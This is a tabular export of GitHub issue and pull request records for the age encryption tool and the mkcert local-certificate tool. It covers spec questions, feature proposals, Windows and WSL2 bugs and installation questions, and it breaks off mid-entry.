FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/20,528207539,MDExOlB1bGxSZXF1ZXN0MzQ1MzE0NDE1,20,support for parsing encryption key from file,2020586,closed,FALSE,NA,NA,1,2019-11-25T16:45:45Z,2021-01-03T14:10:25Z,2021-01-03T14:10:25Z,NONE,NA,Tested with multiple file arguments and with multi-lined files. In compliance with the published spec document.,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/20/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/20/comments,https://api.github.com/repos/FiloSottile/age/issues/20/events,https://github.com/FiloSottile/age/pull/20,https://api.github.com/repos/FiloSottile/age/pulls/20
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/19,516377105,MDExOlB1bGxSZXF1ZXN0MzM1NjQyMDg5,19,Decrypt private keys encrypted with passphrase.,145621,closed,FALSE,NA,NA,5,2019-11-01T22:24:38Z,2019-11-25T17:16:03Z,2019-11-25T16:50:00Z,NONE,NA,"This allows one to decrypt age messages encrypted with a `id_rsa.pub` that is associated with a an encrypted `id_rsa` key.

```
$ ./age -d -i /tmp/secret.age ~/.ssh/id_rsa
Enter passphrase for encrypted id_rsa:
```",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/19/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/19/comments,https://api.github.com/repos/FiloSottile/age/issues/19/events,https://github.com/FiloSottile/age/pull/19,https://api.github.com/repos/FiloSottile/age/pulls/19
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/18,514138317,MDU6SXNzdWU1MTQxMzgzMTc=,18,[spec] clarifications on HTTP hyperlink recipients in CLI,1926905,closed,FALSE,NA,NA,5,2019-10-29T18:38:59Z,2019-11-28T23:40:43Z,2019-11-28T23:39:59Z,CONTRIBUTOR,NA,"I was retooling my website a bit today and also set up https://mdlayher.com/.well-known/age.keys while I was at it. This motivated me to play around and add support for keys residing at a HTTP hyperlink, per the spec.

I've got that code mostly ready whenever you're open to more contributions, but I have a few questions I'd like clarification on:

1) Is it ever reasonable to accept a plaintext HTTP URL for recipients? Since it's trivial to get proper TLS up and running these days, and sending a message to someone whose key you grabbed over plaintext HTTP seems totally insane, I personally am a strong no on this one.

2) What should happen if a server's TLS certificate is invalid or expired? Should a flag like curl's `-k/--insecure` exist?

3) How do you feel about using a domain with no path to mean ""use the well-known path""? For example, https://mdlayher.com would expand to https://mdlayher.com/.well-known/age.keys. Maybe a trailing slash could be permitted too.

Thanks again! Looking forward to more Twitch streams in the future!",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/18/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/18/comments,https://api.github.com/repos/FiloSottile/age/issues/18/events,https://github.com/FiloSottile/age/issues/18,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/17,513444693,MDU6SXNzdWU1MTM0NDQ2OTM=,17,[spec] format for armored files,1926905,closed,FALSE,NA,NA,6,2019-10-28T17:20:08Z,2019-11-28T21:05:35Z,2019-11-25T01:53:53Z,CONTRIBUTOR,NA,"I noticed that @str4d recently implemented support for an ASCII armored file format in rage:

https://github.com/str4d/rage/commit/da923497742a2d8d3a1da5bf70fba1e17953f3f7
https://github.com/str4d/rage/commit/9e779ddfd990dd0a0e8d2d4e229d208fbf2fd900

But I don't see anything in the spec about this format currently. I assume at this point that the two of you are in touch about it (or will be soon anyway), but it'd be good to keep the spec up to date as well.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/17/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/17/comments,https://api.github.com/repos/FiloSottile/age/issues/17/events,https://github.com/FiloSottile/age/issues/17,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/16,512237740,MDExOlB1bGxSZXF1ZXN0MzMyMjg5MjEw,16,Add manpage,9159492,closed,FALSE,NA,NA,1,2019-10-25T00:08:26Z,2020-05-24T05:51:25Z,2020-05-24T05:51:25Z,NONE,NA,"I showed this off in your last twitch stream, so I might as well make a pull request to make it official. I also remove the reference to `gpg(1)` ;).

Some questions:

 - The manual does not currently contain any copyright preamble. Should I assign copyright to Google like the source files?
- I have omitted the `-aliases` flag as it's not described in the spec. My understanding is that `age -aliases filippo` prints the key for `filippo` and `age -aliases filippo key` modifies the key for `filippo`.
- I haven't documented the `keys.txt` file as I'm unsure of its contents. Will it only contain age keys generated with `-G`, or other key types?

As for the options, I have my own private fork that uses `-G` for key generation, `-D` for decryption and `-A` for alias stuff. I prefer this as it retains the classic UNIX argument style, which the same style used by `signify`/`minisign`. But if you're firm on the existing flags then I don't really mind.",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/16/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/16/comments,https://api.github.com/repos/FiloSottile/age/issues/16/events,https://github.com/FiloSottile/age/pull/16,https://api.github.com/repos/FiloSottile/age/pulls/16
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/15,505643821,MDU6SXNzdWU1MDU2NDM4MjE=,15,Default keys and aliases location on non-Unix platforms,4993799,closed,TRUE,NA,NA,3,2019-10-11T05:21:49Z,2021-04-19T03:37:28Z,2021-04-19T03:37:27Z,NONE,NA,"The specification gives the Unix path `~/.config/age/*` as the default location it looks for keys and aliases. How should this map to Windows and macOS? The [directories](https://crates.io/crates/directories) Rust crate (which aims to follow per-OS conventions) appears to indicate the following as being approximately OS-shaped:

- Windows: `C:\Users\Alice\AppData\Roaming\age tool\age\config\*`
- macOS: `/Users/Alice/Library/Preferences/com.age-tool.age/*`

We could also go simpler by just using the known folders for program settings as the base:

- Windows: `C:\Users\Alice\AppData\Roaming\age\*`
- macOS: `/Users/Alice/Library/Preferences/age/*`

Thoughts? Is there somewhere else these should go? Are users expected to be editing these by hand (in which case maybe a Documents-like folder should be used, which is more accessible)?",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/15/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/15/comments,https://api.github.com/repos/FiloSottile/age/issues/15/events,https://github.com/FiloSottile/age/issues/15,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/14,505127614,MDExOlB1bGxSZXF1ZXN0MzI2NjIwMzgz,14,Add missing file close,68182,closed,FALSE,NA,NA,0,2019-10-10T08:49:46Z,2019-10-13T20:34:09Z,2019-10-13T20:34:09Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/14/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/14/comments,https://api.github.com/repos/FiloSottile/age/issues/14/events,https://github.com/FiloSottile/age/pull/14,https://api.github.com/repos/FiloSottile/age/pulls/14
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/13,504915074,MDExOlB1bGxSZXF1ZXN0MzI2NDYzNTI2,13,Fix typo,227442,closed,FALSE,NA,NA,1,2019-10-09T21:50:59Z,2019-10-09T21:57:17Z,2019-10-09T21:57:02Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/13/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/13/comments,https://api.github.com/repos/FiloSottile/age/issues/13/events,https://github.com/FiloSottile/age/pull/13,https://api.github.com/repos/FiloSottile/age/pulls/13
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/12,504898996,MDExOlB1bGxSZXF1ZXN0MzI2NDUxMDY5,12, update readme - added more badges,33070669,closed,FALSE,NA,NA,1,2019-10-09T21:13:15Z,2020-01-10T21:29:09Z,2020-01-10T21:29:09Z,NONE,NA,I think it's good idea - add some useful badges,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/12/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/12/comments,https://api.github.com/repos/FiloSottile/age/issues/12/events,https://github.com/FiloSottile/age/pull/12,https://api.github.com/repos/FiloSottile/age/pulls/12
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/11,504777947,MDExOlB1bGxSZXF1ZXN0MzI2MzU2MzQ2,11,Clean main switch,4771727,closed,FALSE,NA,NA,2,2019-10-09T17:04:39Z,2019-10-24T09:06:58Z,2019-10-24T09:06:57Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/11/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/11/comments,https://api.github.com/repos/FiloSottile/age/issues/11/events,https://github.com/FiloSottile/age/pull/11,https://api.github.com/repos/FiloSottile/age/pulls/11
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/10,504349260,MDU6SXNzdWU1MDQzNDkyNjA=,10,[spec] Consider storing log(N) in scrypt recipient line,4993799,closed,FALSE,NA,NA,1,2019-10-09T00:48:10Z,2019-10-09T03:25:04Z,2019-10-09T03:25:04Z,NONE,NA,"The scrypt library I am using in my Rust implementation takes log(N) as a parameter, which requires a bit of additional logic to handle (computing log(N) from N and verifying that N was an exact power of 2).

Per [RFC 7914 section 6](https://tools.ietf.org/html/rfc7914#section-6):

> N: CPU/Memory cost parameter, must be larger than 1, a power of 2, and less than 2^(128 * r / 8).

If N must always be a power of 2, then we could simplify the format and implementations by instead storing log(N). This would remove the need for power-of-two checks, and converting log(N) to N for APIs that take N is a trivial bitshift.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/10/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/10/comments,https://api.github.com/repos/FiloSottile/age/issues/10/events,https://github.com/FiloSottile/age/issues/10,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/9,504347261,MDU6SXNzdWU1MDQzNDcyNjE=,9,[spec] Per-recipient format is unspecified,4993799,closed,TRUE,NA,NA,6,2019-10-09T00:39:33Z,2021-04-19T01:12:48Z,2020-01-08T19:53:05Z,NONE,NA,"The spec currently says:

> Each recipient line starts with -> and its type name and can be followed by any number of arguments and additional lines. Unknown recipient types are ignored.
>
> `encode(data)` is canonical base64url from RFC 4648 without padding, wrapped at 57 cols.
>
> [...]
>
> An **X25519** recipient line is
> -> X25519 encode(X25519(ephemeral secret, basepoint))
encode(encrypt[HKDF[salt, label](X25519(ephemeral secret, public key), 32)](file key))

This is insufficiently-specified, and does not indicate how arguments and additional lines should be parsed. In particular:

- Should multi-space separators be allowed? (@FiloSottile has already said no)
- For each recipient line type, which arguments should be space-separated and which should be newline-separated? The current Google Doc format in particular makes it very difficult to distinguish between the two.
- How should cross-platform newlines be handled? (see also #2)
- How should multiple arguments that require wrapping be handled? In particular, how should a parser distinguish a single wrapped argument, and two wrapped arguments where the first one's encoding is an integer multiple of 57 characters?",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/9/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/9/comments,https://api.github.com/repos/FiloSottile/age/issues/9/events,https://github.com/FiloSottile/age/issues/9,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/8,504345748,MDU6SXNzdWU1MDQzNDU3NDg=,8,[spec] scrypt doesn't specify an output length,4993799,closed,FALSE,NA,NA,1,2019-10-09T00:33:38Z,2019-10-09T03:10:09Z,2019-10-09T03:10:09Z,NONE,NA,"The `scrypt` definition has no length parameter, but references RFC 7914 which specifies that the output length is variable within bounds. In practice it is constrained by its sole usage as an input to `encrypt` (which per RFC 7539 takes a 256-bit key), but this is inconsistent with the specification of `hkdf` (which is similarly only used for 256-bit outputs but has an explicit length parameter). To save on indirection, the spec should either add an an explicit length parameter to `scrypt`, or just hard-code the 32-byte length in the definitions of `scrypt` and `hkdf`.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/8/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/8/comments,https://api.github.com/repos/FiloSottile/age/issues/8/events,https://github.com/FiloSottile/age/issues/8,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/7,504310836,MDU6SXNzdWU1MDQzMTA4MzY=,7,ssh agent support,1810977,closed,TRUE,NA,NA,7,2019-10-08T22:26:14Z,2021-04-19T01:53:55Z,2021-04-19T01:53:55Z,NONE,NA,"I've made a [POC](https://github.com/42wim/age/tree/sshagent) for ssh agent support by creating a [ssh-agent](https://github.com/42wim/sagent) which uses the ssh-agent extension mechanism. (this way we can keep our keys secure on our devices)

Is this something you would want to support (I can make a PR) or is this out of scope?

",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/7/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/7/comments,https://api.github.com/repos/FiloSottile/age/issues/7/events,https://github.com/FiloSottile/age/issues/7,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/6,503819040,MDExOlB1bGxSZXF1ZXN0MzI1NTk0NjU4,6,"Add the -i, -o flags, and other improvements",9159492,closed,FALSE,NA,NA,3,2019-10-08T04:29:42Z,2019-10-08T10:57:06Z,2019-10-08T10:57:06Z,NONE,NA,"- Only check for invalid flag combinations once, outside the switch.
- Pass os.Files for each function instead of using stdin/stderr by default.

The last comment replaces the use of fmt.Printf with file.WriteString. This *may* fix #2, but I don't have a Windows system on hand to check.",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/6/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/6/comments,https://api.github.com/repos/FiloSottile/age/issues/6/events,https://github.com/FiloSottile/age/pull/6,https://api.github.com/repos/FiloSottile/age/pulls/6
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/5,503788155,MDExOlB1bGxSZXF1ZXN0MzI1NTcyMDQw,5,.travis.yml: enable Travis-CI,1225294,closed,FALSE,NA,NA,0,2019-10-08T02:31:37Z,2019-11-02T21:53:14Z,2019-10-08T02:39:11Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/5/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/5/comments,https://api.github.com/repos/FiloSottile/age/issues/5/events,https://github.com/FiloSottile/age/pull/5,https://api.github.com/repos/FiloSottile/age/pulls/5
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/4,503718110,MDExOlB1bGxSZXF1ZXN0MzI1NTE2Njc4,4,cmd/age: initial support for SSH identities and recipients,1926905,closed,FALSE,NA,NA,0,2019-10-07T22:11:38Z,2019-10-08T02:15:44Z,2019-10-08T02:14:25Z,CONTRIBUTOR,NA,"Signed-off-by: Matt Layher <mdlayher@gmail.com>

This is primitive and only currently accepts SSH recipients via public key text (rather than file), but it seems to work!

```
$ echo ""hello SSH"" | ./age ""`cat test_rsa.pub`"" ""`cat test_ed25519.pub`"" | tee ssh.age
This is a file encrypted with age-tool.com, version 1
-> ssh-rsa X2Vtsw
h5ntTt0PEBcZgtgtjGu0Gxj1DtbJqLVt-9MrYmsgGxNPIy9kL3Dn5vJf61axbBo0OyjBUtSGvpXXRYFazJfWuIj1LeJhnCyK0jLZ5dRPDrVNtT1NqMzlY_Lh9IiNg-V37FLWxCJOkmDO7yYz1URRSnRiurgVfj--emUaBvvc0053ABWE7WOTlmHssQOp8dnjrh3Q6lsOeklLsHnLtahkOS8lqmPs0GH3bx--0calWABTGYktXr3-YJz8-i19b4a-IHBo57BYI3XT9p8KC4dHOdUdt_1r0jriZmdpSj2_2Z3vAdvzH8LbOaXDh1A76ec1LuQL63SUKNEHTChuShi3qg
-> ssh-ed25519 lSfeAQ gwegE4mWBU82XFV3U_9TUY_fZLV1Ps81kLWIcCmFGTA
J355AxSwjGDogzlNxY0yrCRtSNSJ7BNreC5GsmRlUB8
--- JvzsD08j5Cb4gp-sY3470SRZfc90T4KZLN_JPlpzoQw
Kp9&;ZBRP@y0u
$ ./age -d ~/.ssh/test_ed25519 < ssh.age 
hello SSH
$ ./age -d ~/.ssh/test_rsa < ssh.age 
hello SSH
```

As discussed, I know the APIs are a WIP and am happy to make adjustments or rebase my changes as needed.

Fixes #3.",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/4/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/4/comments,https://api.github.com/repos/FiloSottile/age/issues/4/events,https://github.com/FiloSottile/age/pull/4,https://api.github.com/repos/FiloSottile/age/pulls/4
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/3,503676676,MDU6SXNzdWU1MDM2NzY2NzY=,3,cmd/age: support for SSH identities and recipients,1926905,closed,FALSE,NA,NA,2,2019-10-07T20:35:36Z,2019-10-08T02:14:25Z,2019-10-08T02:14:25Z,CONTRIBUTOR,NA,I started poking around at this last night and before work this morning and should have a usable patch at some point after work tonight. Will send a PR.,NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/3/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/3/comments,https://api.github.com/repos/FiloSottile/age/issues/3/events,https://github.com/FiloSottile/age/issues/3,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/2,503239124,MDU6SXNzdWU1MDMyMzkxMjQ=,2,age fails to decrypt files generated in Windows PowerShell,20936452,closed,FALSE,NA,NA,5,2019-10-07T05:25:11Z,2019-11-28T23:36:23Z,2019-11-28T23:36:23Z,NONE,NA,"When attempting a round trip on Windows using PowerShell, age errors out when trying to decrypt a file. I have confirmed the exact same steps work fine in WSL.

It creates the key file and the encrypted `.age` file properly as far as I can tell.

Steps to reproduce:
1. `./age -generate > key.txt`
2. `echo ""Gophers"" | ./age pubkey:h-yq6lhyIAdDc23LVXP_h1X5wpIgHvNk8kvbV0auhG4 > test.txt.age` 
3. `/.age -d key.txt | Get-Content -raw test.txt.age`
4. See error of: ```error: malformed secret keys file ""key.txt"": malformed secret key: ��#   c r e a t e d :   2 0 1 9 - 1 0 - 0 7 T 0 0 : 0 5 : 3 7 - 0 5 : 0 0```

key.txt contents (CRLF line endings):
```
# created: 2019-10-07T00:22:04-05:00
# pubkey:xmAE7g4IsPELqsEkUEner7mlIu4pi2qwda0-s8eq3jw
AGE_SECRET_KEY_MZuIdDrlt4dRUXlmO6FdVwXMHrhzXdgxxgj4yaj9Z14
```
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/2/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/2/comments,https://api.github.com/repos/FiloSottile/age/issues/2/events,https://github.com/FiloSottile/age/issues/2,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/1,503223204,MDExOlB1bGxSZXF1ZXN0MzI1MTIwMzI2,1,internal/age: add x25519KeySize constant to replace repeated integer literals,1926905,closed,FALSE,NA,NA,3,2019-10-07T04:12:20Z,2019-10-09T08:26:20Z,2019-10-09T03:11:25Z,CONTRIBUTOR,NA,"Signed-off-by: Matt Layher <mdlayher@gmail.com>

A quick tidy up to replace some ""magic numbers"" that appear in various places in the X25519 code.",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/1/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/1/comments,https://api.github.com/repos/FiloSottile/age/issues/1/events,https://github.com/FiloSottile/age/pull/1,https://api.github.com/repos/FiloSottile/age/pulls/1
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/363,866094200,MDU6SXNzdWU4NjYwOTQyMDA=,363,import .pem file to system,12712501,closed,FALSE,NA,NA,1,2021-04-23T13:06:13Z,2021-04-23T15:12:06Z,2021-04-23T15:12:06Z,NONE,NA,"Can mkcert import a .pem file which I had made in Linux to Windows? win10 has a Bug about importing root certificate, the certificate can be seen in mmc, but can not be seen in web browser settings.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/363/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/363/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/363/events,https://github.com/FiloSottile/mkcert/issues/363,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/362,857653453,MDU6SXNzdWU4NTc2NTM0NTM=,362,Tablets ,12778286,open,FALSE,NA,NA,0,2021-04-14T08:24:30Z,2021-04-14T08:24:30Z,NA,NONE,NA,"Thanks for this nice development. 

We have an Android app that connects to the cloud and for the development we have decided to replicate locally the setup:

- Local server with certificate (thanks to mkcert)
- Android tablet in the same network

In the original setup (cloud), app is able to make a login. In the local setup, app is not able to make a login. It even does not make the login request. 

Any idea? 

Thanks in advance. ",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/362/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/362/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/362/events,https://github.com/FiloSottile/mkcert/issues/362,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/361,850947127,MDU6SXNzdWU4NTA5NDcxMjc=,361,SSL_ERROR_RX_RECORD_TOO_LONG,50369270,open,FALSE,NA,NA,1,2021-04-06T04:44:12Z,2021-04-10T20:32:06Z,NA,NONE,NA,"I made a certificate using `mkcert -install`. I then went to `https://localhost:8080`, using the test webserver I was running. It worked with `http://localhost:8080`, but not with `https://localhost:8080`. It gave me the error `SSL_ERROR_RX_RECORD_TOO_LONG`. I have attached a screenshot.
It seems like the SSL certificate was successfully created though, I have also attached a screenshot.
<img width=""618"" alt=""Screen Shot 2021-04-05 at 9 43 31 PM"" src=""https://user-images.githubusercontent.com/50369270/113659980-0891e680-9658-11eb-9eb2-a654a32ffec9.png"">

<img width=""897"" alt=""Screen Shot 2021-04-05 at 9 42 39 PM"" src=""https://user-images.githubusercontent.com/50369270/113659898-df715600-9657-11eb-84b5-5211b4f85f5b.png"">
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/361/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/361/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/361/events,https://github.com/FiloSottile/mkcert/issues/361,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/360,841555339,MDU6SXNzdWU4NDE1NTUzMzk=,360,how to run on Windows 7(32bit),48849446,open,FALSE,NA,NA,0,2021-03-26T03:27:02Z,2021-03-26T03:27:02Z,NA,NONE,NA,"hi,  
Can it run on Windows 7 32 bit ?

thanks",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/360/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/360/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/360/events,https://github.com/FiloSottile/mkcert/issues/360,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/359,841297376,MDExOlB1bGxSZXF1ZXN0NjAxMDQ5OTcz,359,release arm64 binaries,425325,open,FALSE,NA,NA,1,2021-03-25T20:49:32Z,2021-03-25T21:06:53Z,NA,NONE,NA,"Now that Go 1.16 is out, we can compile arm64 binaries for macOS.

I tested the resulting binary on my laptop (although I also built it on macOS/arm64). It seemed to work alright.

Fixes: #329",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/359/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/359/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/359/events,https://github.com/FiloSottile/mkcert/pull/359,https://api.github.com/repos/FiloSottile/mkcert/pulls/359
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/358,837085432,MDU6SXNzdWU4MzcwODU0MzI=,358,How to install silently in Windows OS,48849446,closed,FALSE,NA,NA,2,2021-03-21T13:59:43Z,2021-03-22T07:16:21Z,2021-03-22T07:16:21Z,NONE,NA,"Hi：
Thanks for reading, because my English is not good.
This paper uses machine translation.

Due to the need of business development, executing ""mkcert - install"" in Windows system will prompt whether to install certificate or not. How to select ""yes"" installation by default

Thank！",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/358/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/358/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/358/events,https://github.com/FiloSottile/mkcert/issues/358,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/357,836822627,MDU6SXNzdWU4MzY4MjI2Mjc=,357,What is the process for installing in WSL2?,59094233,closed,FALSE,NA,NA,4,2021-03-20T14:30:56Z,2021-04-12T05:59:58Z,2021-03-21T15:44:07Z,NONE,NA,"I honestly can't say if the problem is with WSL2, Docker, Kubernetes, Minikube or mkcert, but I'm wondering: what is the installation process is for WSL2? Should it be done Windows side, or should it be done inside WSL2?

I have the same process for my Linux partition and macOS. The deployment works fine those two but not inside of WSL. The deployment is basically the following:

```
# Download and install mkcert
if [[ `uname` = ""Darwin"" ]] then
    brew install mkcert
    brew install nss
else
    curl -Lo mkcert https://github.com/FiloSottile/mkcert/releases/download/v1.4.3/mkcert-v1.4.3-linux-amd64 && \
        sudo install mkcert /usr/local/bin/
fi

# Installing tls certificate
mkcert -install

# Installing tls certificate
mkcert localhost 127.0.0.1 ::1

# Installing cert-manager locally
kubectl apply -f https://github.com/jetstack/cert-manager/releases/download/v1.2.0/cert-manager.yaml

# Add the certificates to secrets
kubectl create secret tls tls-localhost-dev --key=localhost+2-key.pem --cert=localhost+2.pem -n dev

# Create the tls service that will attach to ingress-nginx
kubectl apply -f k8s/dev/tls.yaml
```
At the end of this (on macOS and Linux), you should be able to spin-up the application, navigate to `localhost` and there is a valid TLS certificate. 

Doesn't work on WSL2 however and while the error is Kubernetes related:
```
 Type     Reason         Age                  From          Message
  ----     ------         ----                 ----          -------
  Warning  ErrGetKeyPair  4m30s (x9 over 19m)  cert-manager  Error getting keypair for CA issuer: secret ""tls-localhost-dev"" not found
  Warning  ErrInitIssuer  4m30s (x9 over 19m)  cert-manager  Error initializing issuer: secret ""tls-localhost-dev"" not found
```
(`tls-localhost-dev` very clearly does exist, btw)...

I can't help but think it is an issue with WSL2 and the `mkcert` certificates. WSL2 does some weird stuff with networking to say the least. 

Should `mkcert` not be used and certificates not installed directly in WSL2? Should they go into Windows itself?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/357/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/357/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/357/events,https://github.com/FiloSottile/mkcert/issues/357,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/355,831712991,MDU6SXNzdWU4MzE3MTI5OTE=,355,Uninstall fails to uninstall,1015506,open,FALSE,NA,NA,0,2021-03-15T11:25:39Z,2021-03-15T11:25:39Z,NA,NONE,NA,"When trying to uninstall the certificates, `mkcert` fails with the following message

```
ERROR: failed to execute ""security remove-trusted-cert"": exit status 1

SecTrustSettingsRemoveTrustSettings: No Trust Settings were found.
```

Here's the shell output:

```
$ mkcert -CAROOT
/Users/zed/Library/Application Support/mkcert

$ mkcert -uninstall
ERROR: failed to execute ""security remove-trusted-cert"": exit status 1

SecTrustSettingsRemoveTrustSettings: No Trust Settings were found.

$ sudo mkcert -uninstall
ERROR: failed to execute ""security remove-trusted-cert"": exit status 1

SecTrustSettingsRemoveTrustSettings: No Trust Settings were found.

```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/355/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/355/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/355/events,https://github.com/FiloSottile/mkcert/issues/355,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/354,830864489,MDU6SXNzdWU4MzA4NjQ0ODk=,354,ERR_SSL_PROTOCOL_ERROR : sent an invalid response,48400531,closed,FALSE,NA,NA,1,2021-03-13T10:14:12Z,2021-03-13T11:06:37Z,2021-03-13T11:06:32Z,NONE,NA,"I installed mkcert using choco in windows 10

Then I generated a certificate for linux.vm domain from windows 10 PowerShell (including mkcert -install command) and imported it in my virtual machine running apache2 server on the ubuntu 20.04 server edition.

when I visit **https://linux.vm** from chrome on windows 10, then it gives me ERR_SSL_PROTOCOL_ERROR (screenshot below)
although **http://linux.vm** working good.

![Screenshot (399)](https://user-images.githubusercontent.com/48400531/111026845-b4a63000-8412-11eb-984a-03bab259d4b4.png)



",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/354/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/354/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/354/events,https://github.com/FiloSottile/mkcert/issues/354,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/353,829437546,MDExOlB1bGxSZXF1ZXN0NTkxMTAzMzE3,353,Tweak glob pattern to include firefox-trunk profle location,2279051,open,FALSE,NA,NA,0,2021-03-11T18:59:49Z,2021-03-11T18:59:49Z,NA,NONE,NA,"Ubuntu team has ppa:ubuntu-mozilla-daily/ppa which provides firefox-trunk
